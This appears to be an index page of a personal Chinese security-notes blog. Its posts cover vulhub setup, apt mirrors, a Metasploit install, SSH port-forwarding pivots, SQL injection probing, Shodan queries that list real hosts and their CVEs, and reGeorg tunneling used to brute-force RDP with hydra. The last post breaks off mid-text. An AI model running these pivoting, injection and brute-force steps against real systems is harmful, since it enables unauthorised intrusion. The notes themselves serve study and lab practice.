<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>空空随笔</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="好记性不如烂笔头，主要用于工作，学习中的随手记录">
<meta property="og:type" content="website">
<meta property="og:title" content="空空随笔">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="空空随笔">
<meta property="og:description" content="好记性不如烂笔头，主要用于工作，学习中的随手记录">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="两袖空空">
<meta property="article:tag" content="笔记 , 研究 , 漏洞">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="空空随笔" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">空空随笔</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">随手记</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-vulnhub" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/vulnhub/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.114Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>vulnhub搭建<br>1、环境<br>    1、本地<br>        首先安装虚拟机<br>            Ubuntu<br>            Cent Os<br>    2、服务器<br>        直接安装docker</p>
<p>2、	安装docker （ubuntu）<br>    apt install	docker.io<br>    apt install python-pip |python3-pip<br>    pip install docker-compose</p>
<p>3、下载vulnhub<br>    wget <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/archive/master.zip">https://github.com/vulhub/vulhub/archive/master.zip</a> -O vulhub.zip<br>    因为墙的原因，所以可能断连 多试几次就行<br>    使用unzip解压<br>        unzip vulnhub.zip</p>
<p>4、启动漏洞环境<br>    cd 切换到漏洞路径下<br>    docker-compose up -d 即可启动漏洞环境</p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/vulnhub/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/vulnhub/" data-id="clcrfe764001g7gvpc58d5qev" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-VPN" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/VPN/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.112Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <pre><code>                CyberGhost VPN		shadowscoks(全局)			v2rayN(全局)
</code></pre>
<p>CMD curl cip.cc		代理IP				本地IP						本地IP<br>CMD shodan myip 	代理IP				代理IP						代理IP<br>网页IP查看			代理IP				本地IP						本地IP</p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/VPN/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/VPN/" data-id="clcrfe75p000k7gvpf45yc7nn" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-UpdateSources" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/UpdateSources/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.093Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>cp &#x2F;etc&#x2F;apt&#x2F;sources.list  &#x2F;etc&#x2F;apt&#x2F;sources.list.bak<br>编辑文件完成后，执行如下命令进行更新缓存</p>
<p>sudo apt update<br>sudo apt upgrade<br>阿里云镜像源#</p>
<pre><code>deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
</code></pre>
<p>清华大学镜像源#</p>
<pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse

# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse
</code></pre>
<p>网易镜像源#</p>
<pre><code>deb http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse
deb http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse
deb http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse
deb http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse
deb http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse
deb-src http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse
deb-src http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse
deb-src http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse
deb-src http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse
deb-src http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse
</code></pre>
<p>中科大镜像源#</p>
<pre><code>deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse
deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse
deb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse
</code></pre>

        
          <p class="article-more-link">
            <a href="/2023/01/09/UpdateSources/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/UpdateSources/" data-id="clcrfe75p000l7gvp5i490aze" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-UbuntuMSF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/UbuntuMSF/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.091Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ubuntu 安装msfconsole<br>    cd &#x2F;opt<br>    sudo wget <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a><br>    sudo mv msfupdate.erb msfinstall<br>    sudo chmod 755 msfinstall<br>    .&#x2F;msfinstall</p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/UbuntuMSF/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/UbuntuMSF/" data-id="clcrfe75n000i7gvpfvg7f7ou" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ssh" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/ssh/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.058Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ssh<br>    ssh协议传输是加密的，内网中很难区分恶意ssh通信，可以建立一些无法建立的TCP连接<br>    防御：限制IP  ssh连接，添加内外双向访问控制策略<br>    使用命令：<br>        ssh  <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#49;&#x30;&#46;&#x31;&#x30;&#x2e;&#56;&#48;&#x2e;&#49;&#x30;&#57;">&#114;&#111;&#x6f;&#116;&#x40;&#49;&#x30;&#46;&#x31;&#x30;&#x2e;&#56;&#48;&#x2e;&#49;&#x30;&#57;</a></p>
<p>参数<br>    -C  压缩传输，提高速度<br>    -f  后台执行ssh，不占用当前shell<br>    -N  建立静默连接（建立了连接，但是看不见具体会话）<br>    -g  允许远程主机连接本地用于转发的端口<br>    -L  本地端口转发<br>    -R  远程端口转发<br>    -D  动态转发（Socks代理）<br>    -P  指定ssh端口</p>
<p>本地转发<br>    (target1：80.107 1.107 做跳板 将target2：1.103 3389 映射到 atck：80.102 4444)<br>    attck<br>        ssh -CfNg  -L 5555:192.168.1.103:3389 <a href="mailto:&#114;&#x6f;&#111;&#116;&#64;&#x31;&#48;&#46;&#x31;&#x30;&#46;&#56;&#48;&#46;&#49;&#48;&#55;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#48;&#46;&#x31;&#x30;&#46;&#56;&#48;&#46;&#49;&#48;&#55;</a><br>        通过 netstat -tulnp | grep “5555” 可以查看 tcp  tcp6 的连接<br>        连接1.103的 3389端口<br>        rdesktop 10.10.80.102:5555 </p>
<p>远程转发<br>    （target1 80.107 1.107 做跳板，target2：1.103 3389 attck：80.102）<br>    target1：<br>        ssh -CfNg -R 3304:192.168.1.103:3389 <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#56;&#48;&#46;&#x31;&#x30;&#50;">&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#56;&#48;&#46;&#x31;&#x30;&#50;</a><br>    attck<br>        通过访问attck 3304端口 访问 1.103 的3389端口<br>        rdesktop 127.0.0.1 3304<br>        netstat -tulnp |grep “3304” 可以看到</p>
<p>动态转发 （建立一个SSH加密的动态的Socks 4|5）的代理隧道<br>    （target1 80.107 1.107 做跳板，target2：1.103 3389 attck：80.102）<br>    attck<br>        ssh-CfNg -D 7788 <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#48;&#x2e;&#49;&#x30;&#46;&#56;&#x30;&#x2e;&#x31;&#x30;&#x37;">&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#48;&#x2e;&#49;&#x30;&#46;&#56;&#x30;&#x2e;&#x31;&#x30;&#x37;</a><br>        设置Socks4 代理 就可以访问内网资源了</p>
<p>常见隧道</p>
<p>网络层：IPV6隧道 ICMP隧道  GRE隧道<br>传输层：TCP隧道  UDP隧道  常见的端口转发工具：LCX  NC<br>应用层：SSH隧道  HTTP隧道 HTTPS隧道  DNS隧道</p>
<p>HTTP|HTTPS协议<br>    reGeory	Meterpreter tunna等
    </p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/ssh/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/ssh/" data-id="clcrfe764001f7gvp7fe8dbj9" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/sql/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.057Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>1、判断类型</p>
<p>1 and 1&#x3D;2  报错 说明是数字型，不报错说明是字符型<br>    此时没有报错说明是字符串型</p>
<p>2、构造闭合</p>
<p>1’ and ‘1’&#x3D;’1  不报错</p>
<p>1’ and ‘1’&#x3D;2’ 报错</p>
<p>确认是字符型注入</p>
<p>1’  或者 1’ and ‘1’&#x3D;’1’  此时报错 且提示多出一个 ‘</p>
<p>成功闭合</p>
<p>3、</p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/sql/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/sql/" data-id="clcrfe762001c7gvp5j0afcub" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-shodan" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/shodan/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.038Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Shodan<br>    Shodan 是一个搜索引擎。<br>    但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，<br>    你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，<br>    其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。<br>学习使用<br>    <a target="_blank" rel="noopener" href="https://asciinema.org/~Shodan">https://asciinema.org/~Shodan</a><br>shodan -h<br>Usage: shodan [OPTIONS] COMMAND [ARGS]…<br>Options:<br>  -h, –help  Show this message and exit.<br>Commands:<br>  alert       Manage the network alerts for your account  # 管理账户的网络提示<br>  convert     Convert the given input data file into a…  # 转换输入文件<br>  count       Returns the number of results for a search  # 返回查询结果数量<br>  download    Download search results and save them in a…  # 下载查询结果到文件<br>  honeyscore  Check whether the IP is a honeypot or not.  # 检查 IP 是否为蜜罐<br>  host        View all available information for an IP…  # 显示一个 IP 所有可用的详细信息<br>  info        Shows general information about your account  # 显示账户的一般信息<br>  init        Initialize the Shodan command-line  # 初始化命令行<br>  myip        Print your external IP address  # 输出用户当前公网IP<br>  parse       Extract information out of compressed JSON…  # 解析提取压缩的JSON信息，即使用download下载的数据<br>  scan        Scan an IP&#x2F; netblock using Shodan.  # 使用 Shodan 扫描一个IP或者网段<br>  search      Search the Shodan database  # 查询 Shodan 数据库<br>  stats       Provide summary information about a search…  # 提供搜索结果的概要信息<br>搜索语法<br>    如果只使用关键字直接进行搜索，搜索结果可能不尽人意，<br>    需要使用一些特定的命令对搜索结果进行过滤，常见用的过滤命令如下所示：<br>    hostname：搜索指定的主机或域名，例如 hostname:”google”<br>    port：搜索指定的端口或服务，例如 port:”21”<br>    country：搜索指定的国家，例如 country:”CN”<br>    city：搜索指定的城市，例如 city:”Hefei”<br>    org：搜索指定的组织或公司，例如 org:”google”<br>    isp：搜索指定的ISP供应商，例如 isp:”China Telecom”<br>    product：搜索指定的操作系统&#x2F;软件&#x2F;平台，例如 product:”Apache httpd”<br>    version：搜索指定的软件版本，例如 version:”1.6.2”<br>    geo：搜索指定的地理位置，参数为经纬度，例如 geo:”31.8639, 117.2808”<br>    before&#x2F;after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”<br>    net：搜索指定的IP地址或子网，例如 net:”210.45.240.0&#x2F;24”<br>命令行下使用 Shodan<br>    查找位于合肥的 Apache 服务器：<br>    apache city:”Hefei”<br>    查找位于国内的 Nginx 服务器：<br>    nginx country:”CN”<br>    查找 GWS(Google Web Server) 服务器：<br>    “Server: gws” hostname:”google”<br>    查找指定网段的华为设备：<br>    huawei net:”61.191.146.0&#x2F;24”</p>
<p>命令行下使用 Shodan<br>    Shodan 是由官方提供的 Python 库的，项目位于：<a target="_blank" rel="noopener" href="https://github.com/achillean/shodan-python">https://github.com/achillean/shodan-python</a><br>安装<br>    pip install shodan<br>或者<br>    git clone <a target="_blank" rel="noopener" href="https://github.com/achillean/shodan-python.git">https://github.com/achillean/shodan-python.git</a> &amp;&amp; cd shodan-python<br>    python setup.py install<br>常用示例<br>init<br>    初始化命令行工具。<br>    shodan init [API_Key]<br>        Successfully initialized<br>info<br>    shodan info<br>        Query credits available: 200000		(用于搜索shodan)<br>        Scan credits available: 65535		(用于扫描IP)</p>
<p>Search<br>  –color &#x2F; –no-color<br>  –fields TEXT         要在搜索结果中显示的属性列表。<br>  –limit INTEGER       应返回的搜索结果数。最大值：1000<br>                        Maximum: 1000<br>  –separator TEXT      搜索结果属性之间的分隔符。<br>  -h, –help            显示此消息并退出。</p>
<pre><code>搜索 nginx 服务器
    shodan search nginx
显示 IP 和端口列表
    shodan search --fields ip_str,port nginx
显示以逗号分隔的 IP 和端口列表
    shodan search --fields ip_str,port --separator , nginx
</code></pre>
<p>count<br>    返回查询的结果数量。<br>    shodan count country:”NZ” product:”QNAP”<br>    查看shodan指定cve漏洞总数<br>    shodan count vuln:cve-2019-0708<br>        52063<br>stats  (统计)<br>    –limit INTEGER要返回的结果数。<br>    –facets TEXT要获取统计信息的facets列表。<br>    -O、 –filename TEXT将结果保存在提供名称的CSV文件中。<br>    -h、 –help显示此消息并退出。</p>
<pre><code>查看漏洞地区发布情况
shodan stats vuln:cve-2022-41352
    Top 0 Results for Facet: country
    Top 0 Results for Facet: org
</code></pre>
<p>  –facets 分类  country | org<br>    通过父类查看漏洞，区分国家<br>    shodan stats –facets country vuln:cve-2019-0708<br>        Top 10 Results for Facet: country<br>        CN                                11,905<br>        US                                 6,715<br>        KR                                 5,391<br>        RU                                 3,055<br>        TW                                 2,025<br>        BR                                 1,818<br>        HK                                 1,592<br>        DE                                 1,141<br>        JP                                 1,077<br>        IT                                 1,038<br>    区分云服务商<br>    shodan stats –facets org vuln:cve-2019-0708 tag:cloud<br>        Top 10 Results for Facet: org<br>        Amazon Technologies Inc.             848<br>        Tencent Cloud Computing (Beijing) Co., Ltd         539<br>        Amazon Data Services NoVa            404<br>        Tencent cloud computing (Beijing) Co., Ltd.         376<br>        Amazon.com, Inc.                     265<br>        Microsoft Corporation                248<br>        A100 ROW GmbH                        166<br>        Amazon Data Services Ireland Limited         122<br>        Vultr Holdings, LLC                   98<br>        Amazon Data Services France           80<br>    统计IP段存活和端口的泄露信息<br>    shodan count net:36.5.161.0&#x2F;16<br>        5713<br>    统计端口方面的泄露信息<br>    shodan stats –facets port net:36.5.161.0&#x2F;16<br>        Top 10 Results for Facet: port<br>        8000                                 782<br>        5357                                 561<br>        8090                                 252<br>        3306                                 239<br>        2323                                 213<br>        111                                  212<br>        8443                                 181<br>        3389                                 166<br>        33060                                134<br>        8081                                 133<br>    查看IP段是否存在漏洞<br>    shodan stats –facets vuln  net:36.5.161.0&#x2F;16<br>        Top 10 Results for Facet: vuln<br>        cve-2016-20012                       128<br>        cve-2020-15778                       128<br>        cve-2021-36368                       128<br>        cve-2017-15906                       127<br>        cve-2018-15473                       127<br>        cve-2018-20685                       127<br>        cve-2019-6109                        127<br>        cve-2019-6110                        127<br>        cve-2019-6111                        127<br>        cve-2020-14145                       127<br>download<br>    下载搜索结果并将其保存在压缩的JSON文件中。<br>        shodan download [OPTIONS] <filename> <search query>	</search></filename></p>
<pre><code>默认情况下，该命令只会下载1000条结果，如果想下载更多结果需要增加--limit 参数。
    --limit INTEGER要下载的结果, 数-1下载所有可能的数据。
    -h、 --help显示此消息并退出。

下载 nginx 的最新 200 个结果
    shodan download --limit 200 myresults.json.gz nginx
下载圣地亚哥服务的最新 500 项搜索结果
    shodan download --limit 500 myresults.json.gz &#39;city:&quot;San Diego&quot;&#39;
下载所有使用 Vue 的网站.js
    shodan download --limit -1 myresults.json.gz http.component:vue.js	
shodan download NZ-qnap country:&quot;NZ&quot; product:&quot;QNAP&quot;
    Search query:                   country:NZ product:QNAP
    Total number of results:        743
    Query credits left:             199938
    Output file:                    NZ-QNAP.json.gz
      [###################################-]   99%  00:00:00
    Saved 743 results into file NZ-QNAP.json.gz
    
</code></pre>
<p>parse -h<br>    我们可以使用 parse 来解析之前 download 的数据文件<br>    它可以帮助我们过滤出自己感兴趣的内容，也可以用来将下载的数据格式从 JSON 转换成 CSV 等等其他格式，<br>    当然更可以用作传递给其他处理脚本的管道。<br>    例如，我们想将上面下载的数据以CSV格式输出IP地址、端口号和组织名称：<br>    shodan parse –fields ip_str,port,org –separator , NZ-QNAP.json.gz<br>        125.237.29.46,443,SPARK NEW ZEALAND TRADING LIMITED<br>        163.47.223.52,8080,2degrees<br>        125.239.152.202,443,Spark New Zealand Trading Ltd<br>        101.98.116.107,8080,CallPlus Services Limited<br>        203.114.141.22,443,Massey University Student Hostels<br>        122.57.98.219,8080,SPARK NEW ZEALAND TRADING LIMITED<br>        119.224.100.164,8080,CallPlus Services Limited<br>        119.224.30.198,8080,CallPlus Services Limited<br>        222.152.3.11,443,Spark New Zealand Trading Ltd<br>        125.237.225.91,8080,SPARK NEW ZEALAND TRADING LIMITED<br>alert<br>    1、创建监控指定IP网络警报&#x2F;情报信息,如果发现就会发送邮件通知(shodan注册时的邮箱)<br>        shodan alert create home 36.5.161.0&#x2F;24<br>            Successfully created network alert!<br>            Alert ID: 98CMJUO48YC6YTBP<br>        查看<br>        shodan alert info 98CMJUO48YC6YTBP<br>            home<br>            Created: 2022-11-17T08:19:21.810000<br>            Notifications: disabled<br>            Network Range(s):<br>             &gt; 36.5.161.0&#x2F;24<br>        开启指定ip相关的任何信息泄漏监控<br>        shodan alert enable 98CMJUO48YC6YTBP any  #可以使用shodan alert triggers查看可以监控的服务，最后替换any为指定服务即可<br>        关闭<br>        shodan alert disable  98CMJUO48YC6YTBP any<br>        Successfully disabled the trigger: any<br>host<br>    1、当前这个IP相关的所有信息<br>        shodan host 161.49.182.140<br>            161.49.182.140<br>            Hostnames:               mail.sanjuancity.gov.ph<br>            City:                    Quezon City<br>            Country:                 Philippines<br>            Organization:            CONVERGE INFORMATION AND COMMUNICATIONS TECHNOLOGY SOLUTIONS, INC<br>            Updated:                 2022-11-16T17:59:02.616142<br>            Number of open ports:    11<br>            Vulnerabilities:         CVE-2018-20685 CVE-2017-15906  CVE-2021-36368  CVE-2020-14145  CVE-2018-15473  CVE-2020-15778 CVE-2021-41617   CVE-2018-15919  CVE-2016-20012  CVE-2019-6110   CVE-2019-6111   CVE-2019-6109</p>
<pre><code>        Ports:
             22/tcp OpenSSH (7.4)
             25/tcp
             53/tcp
             53/udp
            110/tcp
                |-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2
            161/udp
            443/tcp nginx
shodan host --save xxx.xxx.xxx.xxx //保存当前这个IP相关信息
shodan host --save --history xx.xx.xx.xx //保存IP历史相关信息,如果没有历史记录会提示&quot;Error: Unable to parse JSON response&quot;
shodan paser xxx.xxx.xxx.xxx.json.gz //查看下载下来的数据信息
</code></pre>
        
          <p class="article-more-link">
            <a href="/2023/01/09/shodan/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/shodan/" data-id="clcrfe763001e7gvp72g23dxb" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-reGeorg" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/reGeorg/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.036Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>reGeorg</p>
<pre><code>HTTP|HTTPS协议
    reGeorg Meterpreter tunna等
reGeorg是reDuh的升级版
支持 ASPX、PHP、JSP 等web脚本额外提供Tomcat5版本
</code></pre>
<p>使用方法<br>    上传Tunnel.jsp 到目标机<br>    attck<br>        python reGeorgSocksProxy.py -u <a target="_blank" rel="noopener" href="http://10.10.80.107:8080/tunnel.jsp">http://10.10.80.107:8080/tunnel.jsp</a> -p 8888<br>        vim &#x2F;etc&#x2F;proxychains.conf<br>            socks4 127.0.0.1 8888<br>        通过proxychains 代理hydra 爆破3389端口<br>        proxychains hydra -s 3389 -V -l administrator -P &#x2F;tools&#x2F;pass.txt -t 8 10.10.80.107 rdp</p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/reGeorg/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/reGeorg/" data-id="clcrfe761001a7gvpbwdaazyq" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-PWN" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/PWN/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.034Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>PWN学习<br>环境和路线<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/187b810e78d2">https://www.jianshu.com/p/187b810e78d2</a><br>前置知识<br>    1、Linux<br>    2、C语言<br>    3、汇编语言<br>        学会几个常用的前期就够用了，mov、lea、add、sub、ret、call、push、pop 遇到了新的汇编指令，现学现卖就行了<br>    4、计算机组成原理</p>
<p>环境搭建</p>
<pre><code>阿里源： ubuntu 16
</code></pre>
<p>deb-src <a target="_blank" rel="noopener" href="http://archive.ubuntu.com/ubuntu">http://archive.ubuntu.com/ubuntu</a> xenial main restricted<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial main restricted<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial main restricted multiverse universe<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-updates main restricted<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-updates main restricted multiverse universe<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial universe<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-updates universe<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial multiverse<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-updates multiverse<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-backports main restricted universe multiverse<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-backports main restricted universe multiverse<br>deb <a target="_blank" rel="noopener" 